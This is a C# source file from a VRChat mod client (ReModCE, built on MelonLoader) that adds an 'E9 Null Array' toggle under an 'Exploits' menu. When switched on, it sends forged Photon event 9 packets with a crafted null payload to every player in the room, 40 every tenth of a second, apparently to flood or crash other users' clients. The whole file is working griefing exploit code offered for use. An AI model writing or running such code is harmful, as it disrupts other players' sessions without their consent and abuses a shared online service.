using ReMod.Core;
using System;
using ReModCE.Photon;
using ExitGames.Client.Photon;
using MelonLoader;
using Photon.Realtime;
using UnityEngine;
using ReMod.Core.UI.QuickMenu;
using ReMod.Core.Managers;
using ReModCE.EvilEyeSDK;
using System.Collections;
using System.Windows.Forms;

namespace ReModCE.Exploits
{
	internal class Event9 : ModComponent
	{
		public bool _Event9Enabled;
		private static ReMenuToggle _Event9Toggled;
		public Event9()
		{
		}

		public override void OnUiManagerInit(UiManager uiManager)
		{
			var exploitMenu = uiManager.MainMenu.GetCategoryPage("Exploits").GetCategory("Events");
			_Event9Toggled = exploitMenu.AddToggle("E9 Null Array", "haha e9 data go brrr", StartE9, _Event9Enabled);
		}

		public void StartE9(bool value)
		{
			_Event9Enabled = value;
			_Event9Toggled?.Toggle(value);

			if (_Event9Enabled)
			{
				MelonCoroutines.Start(this.PerformE9());
			}
			if (!_Event9Enabled)
			{
				MelonCoroutines.Stop(this.PerformE9());
			}
		}

		private IEnumerator PerformE9()
		{
			byte[] NullPayload = new byte[8];
			byte[] LocalPlayer = BitConverter.GetBytes(int.Parse(PlayerWrapper.LocalPlayer().GetVRCPlayerApi().playerId + "00001"));
			Buffer.BlockCopy(LocalPlayer, 0, NullPayload, 0, 4);
			while (_Event9Enabled)
			{
				MelonLogger.Msg($"E9 Loop Called!");
				int num;
				for (int i = 0; i < 40; i = num + 1)
				{
					PhotonExtensions.OpRaiseEvent(9, NullPayload, new RaiseEventOptions
					{
						field_Public_ReceiverGroup_0 = 0,
						field_Public_EventCaching_0 = 0
					}, SendOptions.SendReliable);
					num = i;
				}
				yield return new WaitForSecondsRealtime(0.1f);
			}
			yield break;
		}
	}
}
